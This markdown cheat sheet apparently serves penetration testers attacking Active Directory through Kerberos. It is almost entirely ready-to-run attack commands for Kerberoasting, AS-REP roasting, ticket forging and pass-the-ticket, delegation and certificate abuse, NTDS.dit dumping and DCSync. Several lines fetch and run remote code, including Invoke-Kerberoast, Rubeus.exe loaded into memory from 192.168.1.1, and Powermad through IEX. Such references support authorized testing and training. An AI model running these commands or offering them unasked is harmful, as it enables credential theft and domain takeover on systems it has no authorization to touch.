# Kerberos

Ticket abuse, roasting, delegation, ticket handling, and operational caveats such as time skew and ccache hygiene.
Treat this as the primary Kerberos workflow page when the domain is understood and you are working the auth layer directly.

## Active Directory Kerberos Checklist

1. Ensure you use FQDNs, not IP addresses.
2. Check the [Kerberos Cheat Sheet](Kerberos-Cheat%20Sheet.pdf) for reference.
3. Enumerate usernames with Kerbrute.
4. Check current tickets with `klist`.
5. List tickets with Rubeus:

```powershell
Rubeus.exe klist
```

6. Dump tickets and attempt to crack them.
7. Check for Kerberoastable accounts.
8. Create Silver Tickets if possible.
9. Perform ASREPRoasting with a complete user list.
10. Conduct AS-REQ password spraying with Rubeus.
11. Investigate unconstrained delegation.
12. Investigate constrained delegation.
13. Look for cached credentials.
14. Attempt to access LSASS memory.
15. Check for legacy protocols.
16. Verify if WDigest is enabled.
17. Enumerate SPNs with `nxc ldap`:

```bash
nxc ldap 192.168.123.0/24 -u 'username' -p 'password' --kerberoast spns.txt
```

18. Repeat enumeration steps—**Enumeration is key; try harder.**
19. Verify all findings and ensure no steps were missed.

## Kerberoasting

```
# Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs

# PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.
Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Cracking Kerberos ticket hash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force

# Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host.
mimikatz # base64 /out:true

# Mimikatz command used to extract the TGS tickets from a Windows-based host.
kerberos::list /export

# Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.
echo "<base64 blob>" | tr -d \\n

# Used to output a file (encoded_file) into a .kirbi file in base64 (base64 -d > sqldev.kirbi) format from a Linux-based host.
cat encoded_file | base64 -d > sqldev.kirbi

# Used to extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host.
python2.7 kirbi2john.py sqldev.kirbi

# Used to modify the crack_file for Hashcat from a Linux-based host.
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.
Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname

# PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.
.\Rubeus.exe kerberoast /user:testspn /nowrap

# PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
Find-InterestingDomainAcl

# Used to import PowerView and retrieve the SID of aspecific user account (wley) from a Windows-based host.
Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley

# Used to create a PSCredential Object from a Windows-based host.
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# PowerView tool used to add a specifc user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# PowerView tool used create a fake Service Principal Name given a sepecift user (adunn) from a Windows-based host.
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

## ASREPRoasting

```
# PowerView based tool used to search for the DONT_REQ_PREAUTH value across in user accounts in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Uses Rubeus to perform an ASEP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host.
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt

# Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

# PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
Get-ADTrust -Filter *

# PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
Get-DomainTrust

# PowerView tool used to perform a domain trust mapping from a Windows-based host.
Get-DomainTrustMapping

# PowerView tool used to enumerate accounts for associated SPNs from a Windows-based host.
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

# PowerView tool used to enumerate the mssqlsvc account from a Windows-based host.
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof

# PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

# PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

## Prerequisites

- Hash of krbtgt
```
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
mimikatz # misc::cmd
```

## Execution

Use the `hostname` and not the `IP address` because otherwise it would authenticate via `NTLM` and the access would still be blocked.

```
.\PsExec.exe \\<RHOST> cmd
```

> [https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/)

```
vshadow.exe -nw -p  C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak
reg.exe save hklm\system C:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
```
certipy-ad find -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
```
```
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -dns <RHOST>
certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```
```
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template '<TEMPLATE>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```
```
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template '<TEMPLATE>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```
```
certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>' -save-old
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target <RHOST> -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>'
$ certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```

or

```
certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>' -save-old
certipy-ad req -ca '<CA>' -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <RHOST> -template '<TEMPLATE>' -target <RHOST> -upn 'Administrator@<DOMAIN>' -debug
certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```

## impacket-GetNPUsers

```
impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format john -outputfile hashes
impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
```

## impacket-getUserSPNs

```
impacket-GetUserSPNs <DOMAIN>/<USERNAME> -dc-ip <RHOST> -request
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -request
```
```
export KRB5CCNAME=<USERNAME>.ccache
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<DOMAIN> -no-pass -request
```

## Kerberos

> [https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

## General Notes

- Golden Ticket is a Ticket Granting Ticket (TGT) and completely forged offline (KRBTGT Account Hash needed).
- Silver Ticket is a forged service authentication ticket (Service Principal Name (SPN) and Machine Account Keys (Hash in RC4 or AES) needed). Silver Tickets do not touch the Domain Controller (DC).
- Diamond Ticket is essentially a Golden Ticket but requested from a Domain Controller (DC).

## Bruteforce

```
./kerbrute -domain <DOMAIN> -users <FILE> -passwords <FILE> -outputfile <FILE>
```
```
.\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<DOMAIN> /outfile:<FILE>
```
```
.\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>
```

## ASPREPRoast

```
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile <FILE>
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format john -outputfile <FILE>
```
```
impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format hashcat -outputfile <FILE>
impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
```
```
.\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
```

## Kerberoasting

```
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
.\Rubeus.exe kerberoast /outfile:<FILE>
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
```
```
impacket-getTGT <DOMAIN>/<USERNAME> -hashes <LMHASH>:<NTLMHASH>
```
```
impacket-getTGT <DOMAIN>/<USERNAME> -aesKey <KEY>
```
```
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```
```
.\Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<NTLMHASH> /ptt
```
```
.\PsExec.exe -accepteula \\<RHOST> cmd
```
```
grep default_ccache_name /etc/krb5.conf
```
- If none return, default is FILE:/tmp/krb5cc\_%{uid}
- In Case of File Tickets it is possible to Copy-Paste them to use them
- In Case of being KEYRING Tickets, the Tool tickey can be used to get them
- To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes
- To inject, the Ticket have to be copied in a reachable Folder by all Users
```
cp tickey /tmp/tickey
/tmp/tickey -i
```
```
sekurlsa::tickets /export
.\Rubeus dump
```
```
[IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
```

> [https://github.com/Zer1t0/ticket\_converter](https://github.com/Zer1t0/ticket_converter)

```
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```
```
kerberos::ptt <KIRBI_FILE>
```
```
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```
```
.\PsExec.exe -accepteula \\<RHOST> cmd
```

## Impacket Examples

```
python ticketer.py -nthash <NTLMHASH> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```
```
python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

## mimikatz Examples

```
kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```
```
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```
```
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```
```
kerberos::ptt <KIRBI_FILE>
```

## Rubeus Examples

```
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```
```
.\PsExec.exe -accepteula \\<RHOST> cmd
```

## Impacket Examples

```
python ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```
```
python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

## mimikatz Examples

```
kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
```
```
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
```
```
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
```
```
kerberos::ptt <KIRBI_FILE>
```

## Rubeus Examples

```
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```
```
.\PsExec.exe -accepteula \\<RHOST> cmd
```
```
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
```

## Golden Ticket

```
.\SeManageVolumeExploit
```
```
certutil -store My
```
```
certutil -exportPFX My 75b2f4bbd71f108945247b466161bdph <FILE>.pfx
```
```
certipy-ad forge -ca-pfx '<FILE>.pfx' -upn 'Administrator@<DOMAIN>' -subject 'CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>'
```
```
certipy-ad auth -pfx administrator_forged.pfx -dc-ip <RHOST>
```

## Common Commands

```
.\Rubeus.exe dump /nowrap
.\Rubeus.exe asreproast /nowrap
.\Rubeus.exe asreproast /outfile:hashes.asreproast
.\Rubeus.exe kerberoast /nowrap
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
```
.\Rubeus.exe tgtdeleg /nowrap
```
```
.\Rubeus.exe kerberoast /user:<USERNAME>
```
```
.\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials
```

## Rubeus monitor (user or computer)

```
Invoke-Rubeus monitor /interval:5 /nowrap /filteruser:<username>
```

## Rubeus pass the ticket

```
Invoke-Rubeus ptt /ticket:<base64_ticket>
```

## Rubeus Create a process with other user

```
Invoke-Rubeus asktgt /user:<username> /rc4:<nthash> /createnetonly:powershell.exe /show
```

## Rubeus asreproast PreauthNotRequired user

```
Invoke-Rubeus asreproast /format:hashcat /outfile:hashes.asreproast /user:<username
```

## ticketConverter.py Convert kribi to ccache

```
impacket-ticketConverter <kribi> <ccache>.ccache && export KRB5CCNAME=/tmp/<ccache>.ccache
```

## impacket Sliver Ticket for DC

```
getST.py -self -impersonate "Administrator" -altservice "cifs/<dc_hostname>" -k -no-pass -dc-ip <dc_ip> <domain>/'<dc_hostname>$'

export KRB5CCNAME=<ticket_from_output>.ccache
```

## Hashcat Cracking AS-REP (ASREPRoast, PreauthNotRequired)

```
hashcat -m 18200 --force -a 0 <hashfile> /usr/share/wordlists/rockyou.txt
```

## Unconstrained delegation

Get unconstrained delegation computers

```powershell
Get-DomainComputer -Unconstrained

-Domain domain.com (optional to enum other domains in forest)
```

View and use forwardable tickets on unconstrained host

```plaintext
privilege::debug
sekurlsa::tickets
sekurlsa::tickets /export
kerberos::ptt <filename>
C:\Tools\SysinternalsSuite\PsExec.exe \\dc01 cmd
whoami
```

Check printer spooler service active on remote host

```plaintext
dir \\dc01\pipe\spoolss
ls \\dc01\pipe\spoolss
```

Rubeus monitor for incoming tickets filtered by host (run on Unconstrained delegation host)

```plaintext
Rubeus.exe monitor /interval:5 /filteruser:DC01$
```

Force remote host to connect to host

```plaintext
SpoolSample.exe DC01 TARGET01
```

Use ticket with Rubeus

```plaintext
Rubeus.exe ptt /ticket:<base64>
```

Force dcsync using mimikatz to get user hashes using injected ticket

```plaintext
lsadump::dcsync /domain:x.domain.com /user:x\krbtgt
lsadump::dcsync /domain:x.domain.com /user:x\administrator
```

## Constrained delegation

Get constrained delegation computers

```powershell
Get-DomainComputer -TrustedToAuth

-Domain d.com (optional to enum other domains in forest)
```

Generate a TGT for a user

```plaintext
.\Rubeus.exe asktgt /user:iissvc /domain:x.com /rc4:<hash>
```

S4U Constrained Delegation generate ticket for any domain user

```plaintext
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.domain.com:1433 /ptt
```

S4U Constrained Delegation generate ticket for any domain user for a alternative service on the same host

```plaintext
.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.domain.com:1433 /altservice:CIFS /ptt
```

PowerShell Remotely load rubeus

```plaintext
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.1/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("purge".Split())
[Rubeus.Program]::Main("s4u /user:host$ /rc4:x /impersonateuser:administrator /msdsspn:cifs/host$ /ptt".Split())
ls \\host\c$
```

## Resource-Based Constrained Delegation

Get GenericWrite computers

```powershell
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

Get machine quota in the domain

```powershell
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
```

Add computer using PowerMad

```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/Powermad.ps1') | IEX

New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
```

Update msDS-AllowedToActOnBehalfOfOtherIdentity of ‘server’ object to newly created machine

```powershell
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
Get-DomainComputer -Identity server | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Use computer account to generate ticket

```plaintext
.\Rubeus.exe s4u /user:myComputer$ /rc4:x /impersonateuser:administrator /msdsspn:CIFS/dc01.domain.com /ptt
```

Add computer using impacket

```plaintext
python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -k -no-pass -computer-name 'rbcd$' -computer-pass 'Password12345' -dc-ip 1.1.1.1 DOMAIN/user -dc-host dc.domain.com
```

Update msDS-AllowedToActOnBehalfOfOtherIdentity of ‘server’ object to newly created machine using impacket

```plaintext
python3 rbcd.py -delegate-to 'HOST$' -delegate-from 'rbcd$' -action write -k -no-pass DOMAIN/user -debug
```

Get service ticket using impacket

```plaintext
python3 /usr/share/doc/python3-impacket/examples/getST.py -spn CIFS/HOST.DOMAIN.COM -impersonate 'Administrator' -dc-ip 1.1.1.1 'DOMAIN/rbcd$:Password12345'
```

## Kerberoasting

PowerShell load assembly Rubeus from base64

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Rubeus.exe")) | Out-File -Encoding ASCII C:\Temp\rubeus.txt

$a = Get-Content .\rubeus.txt
$assem = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($a))
```

Export all available tickets

```plaintext
[Rubeus.Program]::Main("kerberoast /outfile:C:\temp\hashes.txt".Split())
```
